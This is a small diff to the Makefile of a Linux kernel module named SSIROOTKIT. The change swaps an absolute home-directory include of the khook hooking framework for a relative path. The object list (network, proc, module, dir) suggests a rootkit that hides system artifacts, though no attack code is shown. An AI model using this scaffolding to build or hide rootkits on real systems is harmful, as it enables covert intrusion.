@@ -1,5 +1,5 @@
 MODNAME	?= SSIROOTKIT
-include /home/anass/myprojects/khook/Makefile.khook
+include $(PWD)/khook/khook/Makefile.khook
 obj-m := $(MODNAME).o
 
 $(MODNAME)-y += main.o network.o proc.o module.o dir.o  $(KHOOK_GOALS)
